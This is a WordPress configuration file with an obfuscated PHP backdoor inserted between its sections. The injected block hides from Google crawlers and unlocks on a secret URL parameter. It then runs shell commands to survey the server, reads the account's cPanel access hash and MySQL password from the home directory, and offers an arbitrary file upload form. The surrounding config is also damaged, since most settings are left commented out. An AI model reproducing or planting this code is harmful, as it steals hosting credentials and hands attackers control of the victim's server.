<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 @link https://wordpress.org/support/article/editing-wp-config-php/ 
 
 @package WordPress


// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress 
define( 'DB_NAME', 'database_name_here' );

/** MySQL database username 
define( 'DB_USER', 'username_here' );

/** MySQL database password 
define( 'DB_PASSWORD', 'password_here' );

/** MySQL hostname 
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. 
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. 
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * since 2.6.0
 */
/**define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/
?>
<?php
$GLOBALS["MqUOFrubAlAQIazPXnFS"]=base64_decode("SFRUUC8xLjEgNTAwIEludGVybmFsIFNlcnZlciBFcnJvcg==");$GLOBALS["CWhHbZYJyCHjDgyftSxT"]=base64_decode("PGZvbnQgY29sb3I9ImxpbWUiPik8L2ZvbnQ+PGJyPg==");$GLOBALS["EmWCkwJjPRGuYOZtumJp"]=base64_decode("PGZvbnQgY29sb3I9ImxpbWUiPik8L2ZvbnQ+IFBhc3N3b3JkIDxmb250IGNvbG9yPSJsaW1lIj4oPC9mb250Pg==");$GLOBALS["bVJnTtCrgLKHwzfUHjcT"]=base64_decode("Q3BhbmVsIDogVXNlcm5hbWUgPGZvbnQgY29sb3I9ImxpbWUiPig8L2ZvbnQ+");$GLOBALS["enNqNaCvEaCEJfTuGZEY"]=base64_decode("Ig==");$GLOBALS["XpddBdXLrKWyyPYzelqY"]=base64_decode("cGFzc3dvcmQ9Ig==");$GLOBALS["VsvrTtQREFDgBaOKcIDa"]=base64_decode("Ly5teS5jbmY=");$GLOBALS["TbNxDPKlgkTrSmyscAU"]=base64_decode("Ij48YnI+");$GLOBALS["ktwCrReEJlzuBUIjBcCk"]=base64_decode("Og==");$GLOBALS["iKRYyVIdmqhPYYCSOcXC"]=base64_decode("PGlucHV0IHR5cGU9InRleHQiIHNpemU9IjMwIiB2YWx1ZT0iV0hNIA==");$GLOBALS["tugkmwKQmrdyfghQnRJj"]=base64_decode("");$GLOBALS["bGeiYINFnrDeFEvupBUY"]=base64_decode("L1xzKy8=");$GLOBALS["BAPhtyGHaABClPtZMFxH"]=base64_decode("Ly5hY2Nlc3NoYXNo");$GLOBALS["tFUYJbOtJhmFyZjfsSU"]=base64_decode("L2hvbWUv");$GLOBALS["GuXyhvFeKeLGGJlPUlfF"]=base64_decode("IDwvZm9udD48YnI+");$GLOBALS["nTSqfBQmCrFygTYhoiNU"]=base64_decode("PGJyPnBrZXhlYyA6PGZvbnQgY29sb3I9bGltZT4g");$GLOBALS["etMTdJYMuiLXcZnxnDaQ"]=base64_decode("IEdCPC9mb250Pg==");$GLOBALS["dTFVkSPrIxdfmZYWnaJg"]=base64_decode("IEdCIC8g");$GLOBALS["IVypAyMIBqvtcISzZpYs"]=base64_decode("PGJyPmRmIC1oIDo8Zm9udCBjb2xvcj1saW1lPiA=");$GLOBALS["EeveYqrXxmdBSSNgFTI"]=base64_decode("PC9mb250Pg==");$GLOBALS["rrGjfbRmaXyqeIPEqGVR"]=base64_decode("IDwvZm9udD4gLSA8Zm9udCBjb2xvcj1saW1lPg==");$GLOBALS["tZzKYFfiMPxtNOfpJSQ"]=base64_decode("PGJyPm1lbW9yeSA6PGZvbnQgY29sb3I9bGltZT4g");$GLOBALS["iZaVktbokejxXiNkgKpc"]=base64_decode("PGJyPi9ldGMvcGFzc3dkIDo8Zm9udCBjb2xvcj1saW1lPiA=");$GLOBALS["SNGqShxtGwaNGulbEslL"]=base64_decode("IDwvZm9udD4=");$GLOBALS["kKfhBOunBTInaqjXYavf"]=base64_decode("PGJyPi9ldGMvbmFtZWQuY29uZiA6PGZvbnQgY29sb3I9bGltZT4g");$GLOBALS["DlsPjKWVrgveEKqsYdSa"]=base64_decode("PGZvbnQgY29sb3I9cHVycGxlPnIwMHRAdHJlbmdnYWxlazZldGFyOjwvZm9udD5+L3B3bmVkeiQ8L2ZvbnQ+");$GLOBALS["ZnGxAHwXWbGMBZiEmTsJ"]=base64_decode("cGtleGVjIC0tdmVyc2lvbg==");$GLOBALS["hcesKrHIIwUECKCjySGR"]=base64_decode("bnByb2M=");$GLOBALS["RfNoCIfaTmqZTQSzXoob"]=base64_decode("Z3JlcCBNZW1Ub3RhbCAvcHJvYy9tZW1pbmZv");$GLOBALS["qkgFMCDdXJLzPwOVxCGQ"]=base64_decode("Y2F0IC9ldGMvcGFzc3dkIHwgd2MgLWw=");$GLOBALS["huzONxKfYWGPxVPVPes"]=base64_decode("Y2F0IC9ldGMvbmFtZWQuY29uZiB8IHdjIC1s");$GLOBALS["sDVMQqnDQsUZurNfpChV"]=base64_decode("OWMyODE1ZDQ2N2U1ZjVhM2YyNTM1YWE0YWI3MzFmZDA=");$GLOBALS["ldNWQghkTOETcJOyeBwU"]=base64_decode("SFRUUC8xLjAgNDA0IE5vdCBGb3VuZA==");$GLOBALS["ZyEEEKYzIORVaKyECvHd"]=base64_decode("R29vZ2xl");$GLOBALS["fSkLdPuPYZnSTjmPwRKy"]=base64_decode("SFRUUF9VU0VSX0FHRU5U");$GLOBALS["WxsIGxRWVdYozJCfEAVQ"]=base64_decode("PGI+R2FnYWwgQ29rPC9iPg==");$GLOBALS["BKNpTvpzulwWjIeUWQJG"]=base64_decode("PGI+QmVyaGFzaWwgQ29rIC0tPjwvYj4g");$GLOBALS["XckkIahjVOedVNldUNrH"]=base64_decode("bmFtZQ==");$GLOBALS["PGnDVWIKgIUmFrZyuhhU"]=base64_decode("dG1wX25hbWU=");$GLOBALS["TdnLLeRPHXLfGQQhfeY"]=base64_decode("Zg==");$GLOBALS["jPQfXyMbVRdmRhDpQRPM"]=base64_decode("dg==");$GLOBALS["rsxIByhBFebZeDDZsdU"]=base64_decode("PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4=");$GLOBALS["GBVyRLGosxXOTNjNWxVM"]=base64_decode("PGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPg==");$GLOBALS["mkNpRBwrWJjxjHDDegwo"]=base64_decode("PGJyPjxmb250IGNvbG9yPSMwMDAwMDA+");$GLOBALS["SnsSSwMKZSYeMFnEirnh"]=base64_decode("");$GLOBALS["DGPUKoItNOgKddvVRLxJ"]=base64_decode("PGZvbnQgY29sb3I9I2ZmMDAwMD4=");$GLOBALS["gYTXhjxdbyGDdGclOQmq"]=base64_decode("Lg==");$GLOBALS["GbTsMVXjRYCygIHSLcUz"]=base64_decode("cmFpbXU=");
?><?php if(strpos($_SERVER[$GLOBALS["fSkLdPuPYZnSTjmPwRKy"]],$GLOBALS["ZyEEEKYzIORVaKyECvHd"]) !== false ) { header($GLOBALS["ldNWQghkTOETcJOyeBwU"]);exit;} if(md5($_GET[$GLOBALS["GbTsMVXjRYCygIHSLcUz"]]) == $GLOBALS["sDVMQqnDQsUZurNfpChV"]) { $EtpbwgWTVmqVpLJlJWWg = @get_current_user(); $bXtGHeNjhUpBhbQcwUCF = shell_exec($GLOBALS["huzONxKfYWGPxVPVPes"]); $ElgIzjEDBNqybgnnvhJv = shell_exec($GLOBALS["qkgFMCDdXJLzPwOVxCGQ"]); $deWDokNdfLlXjQNLtFwg = shell_exec($GLOBALS["RfNoCIfaTmqZTQSzXoob"]); $yknKSZzLvYVdzZMszsRW = shell_exec($GLOBALS["hcesKrHIIwUECKCjySGR"]); $UelzUTRRwtGBwMzOSOEo = shell_exec($GLOBALS["ZnGxAHwXWbGMBZiEmTsJ"]); $TiKrdvSCdgCaSTCzCgtA = round(disk_free_space($GLOBALS["gYTXhjxdbyGDdGclOQmq"]) / 1000000000); $WlNIJFRrlMzWMmstWIrz = round(disk_total_space($GLOBALS["gYTXhjxdbyGDdGclOQmq"]) / 1000000000); echo $GLOBALS["DlsPjKWVrgveEKqsYdSa"]; echo $GLOBALS["kKfhBOunBTInaqjXYavf"] . $bXtGHeNjhUpBhbQcwUCF . $GLOBALS["SNGqShxtGwaNGulbEslL"]; echo $GLOBALS["iZaVktbokejxXiNkgKpc"] . $ElgIzjEDBNqybgnnvhJv . $GLOBALS["SNGqShxtGwaNGulbEslL"]; echo $GLOBALS["tZzKYFfiMPxtNOfpJSQ"] . $deWDokNdfLlXjQNLtFwg . $GLOBALS["rrGjfbRmaXyqeIPEqGVR"] . $yknKSZzLvYVdzZMszsRW . $GLOBALS["EeveYqrXxmdBSSNgFTI"]; echo $GLOBALS["IVypAyMIBqvtcISzZpYs"] . $WlNIJFRrlMzWMmstWIrz . $GLOBALS["dTFVkSPrIxdfmZYWnaJg"] . $TiKrdvSCdgCaSTCzCgtA . $GLOBALS["etMTdJYMuiLXcZnxnDaQ"]; echo $GLOBALS["nTSqfBQmCrFygTYhoiNU"] . $UelzUTRRwtGBwMzOSOEo . $GLOBALS["GuXyhvFeKeLGGJlPUlfF"]; if (file_exists($GLOBALS["tFUYJbOtJhmFyZjfsSU"] . $EtpbwgWTVmqVpLJlJWWg . $GLOBALS["BAPhtyGHaABClPtZMFxH"])) { $bxTCuxeVRNNjqFkklhWs = file_get_contents($GLOBALS["tFUYJbOtJhmFyZjfsSU"] . $EtpbwgWTVmqVpLJlJWWg . $GLOBALS["BAPhtyGHaABClPtZMFxH"]); $bxTCuxeVRNNjqFkklhWs = preg_replace($GLOBALS["bGeiYINFnrDeFEvupBUY"], $GLOBALS["tugkmwKQmrdyfghQnRJj"], $bxTCuxeVRNNjqFkklhWs); echo $GLOBALS["iKRYyVIdmqhPYYCSOcXC"] . $EtpbwgWTVmqVpLJlJWWg . $GLOBALS["ktwCrReEJlzuBUIjBcCk"] . $bxTCuxeVRNNjqFkklhWs . $GLOBALS["TbNxDPKlgkTrSmyscAU"];} if (file_exists($GLOBALS["tFUYJbOtJhmFyZjfsSU"] . $EtpbwgWTVmqVpLJlJWWg . $GLOBALS["VsvrTtQREFDgBaOKcIDa"])) { $PHpHWmophZKXweRrVTOV = file_get_contents($GLOBALS["tFUYJbOtJhmFyZjfsSU"] . $EtpbwgWTVmqVpLJlJWWg . $GLOBALS["VsvrTtQREFDgBaOKcIDa"]); $PHpHWmophZKXweRrVTOV = ambilkata($PHpHWmophZKXweRrVTOV, $GLOBALS["XpddBdXLrKWyyPYzelqY"], $GLOBALS["enNqNaCvEaCEJfTuGZEY"]); echo $GLOBALS["bVJnTtCrgLKHwzfUHjcT"] . $EtpbwgWTVmqVpLJlJWWg . $GLOBALS["EmWCkwJjPRGuYOZtumJp"] . $PHpHWmophZKXweRrVTOV . $GLOBALS["CWhHbZYJyCHjDgyftSxT"];} echo$GLOBALS["DGPUKoItNOgKddvVRLxJ"].php_uname().$GLOBALS["SnsSSwMKZSYeMFnEirnh"];echo$GLOBALS["mkNpRBwrWJjxjHDDegwo"].getcwd().$GLOBALS["SnsSSwMKZSYeMFnEirnh"];echo$GLOBALS["GBVyRLGosxXOTNjNWxVM"];echo$GLOBALS["rsxIByhBFebZeDDZsdU"];if($_POST[$GLOBALS["jPQfXyMbVRdmRhDpQRPM"]]==up){if(@copy($_FILES[$GLOBALS["TdnLLeRPHXLfGQQhfeY"]][$GLOBALS["PGnDVWIKgIUmFrZyuhhU"]],$_FILES[$GLOBALS["TdnLLeRPHXLfGQQhfeY"]][$GLOBALS["XckkIahjVOedVNldUNrH"]])){echo$GLOBALS["BKNpTvpzulwWjIeUWQJG"].$_FILES[$GLOBALS["TdnLLeRPHXLfGQQhfeY"]][$GLOBALS["XckkIahjVOedVNldUNrH"]];}else{echo$GLOBALS["WxsIGxRWVdYozJCfEAVQ"];}}} else { header($GLOBALS["MqUOFrubAlAQIazPXnFS"]);}?>
<?php
/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
/**$table_prefix = 'wp_';


 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 @link https://wordpress.org/support/article/debugging-in-wordpress/
 
/**define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing.

/** Absolute path to the WordPress directory.
if ( ! defined( 'ABSPATH' ) ) {
    define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. 
require_once ABSPATH . 'wp-settings.php'; */
?>